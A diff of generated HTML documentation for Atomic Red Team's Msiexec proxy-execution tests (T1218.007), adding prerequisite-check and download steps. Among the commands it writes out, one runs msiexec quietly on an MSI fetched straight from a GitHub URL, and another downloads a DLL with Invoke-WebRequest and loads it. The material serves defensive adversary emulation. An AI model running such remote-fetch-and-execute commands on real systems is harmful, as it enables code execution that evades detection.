@@ -914,6 +914,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-t1218-msi-must-exist-on-disk-at-specified-location-msi-payload">
+         Description: T1218.msi must exist on disk at specified location (#{msi_payload})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -949,6 +977,34 @@
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id2">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-t1218-dll-must-exist-on-disk-at-specified-location-dll-payload">
+         Description: T1218.dll must exist on disk at specified location (#{dll_payload})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id5">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -994,9 +1050,34 @@
 <h3>Atomic Test #1 - Msiexec.exe - Execute Local MSI file<a class="headerlink" href="#atomic-test-1-msiexec-exe-execute-local-msi-file" title="Permalink to this headline">¶</a></h3>
 <p>Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-t1218-msi-must-exist-on-disk-at-specified-location-msi-payload">
+<h5>Description: T1218.msi must exist on disk at specified location (#{msi_payload})<a class="headerlink" href="#description-t1218-msi-must-exist-on-disk-at-specified-location-msi-payload" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">007</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">Win32</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">msi</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Write-Host</span> <span class="s2">&quot;You must provide your own MSI&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">007</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>msiexec.exe /q /i &quot;#{msi_payload}&quot;
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>msiexec.exe /q /i &quot;PathToAtomicsFolder\T1218.007\src\Win32\T1218.msi&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1014,7 +1095,7 @@
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>msiexec.exe /q /i &quot;#{msi_payload}&quot;
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>msiexec.exe /q /i &quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1033,8 +1114,34 @@ Upon execution, a window titled “Boom!” will open that says “Locked and Lo
 By default, if the src folder is not in place, it will download the 64 bit version.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="id2">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>msiexec.exe /y &quot;#{dll_payload}&quot;
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-t1218-dll-must-exist-on-disk-at-specified-location-dll-payload">
+<h5>Description: T1218.dll must exist on disk at specified location (#{dll_payload})<a class="headerlink" href="#description-t1218-dll-must-exist-on-disk-at-specified-location-dll-payload" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id3">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">007</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id4">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">007</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">T1218</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1218.007\src\x64\T1218.dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1218</span><span class="o">.</span><span class="mi">007</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>msiexec.exe /y &quot;PathToAtomicsFolder\T1218.007\src\x64\T1218.dll&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
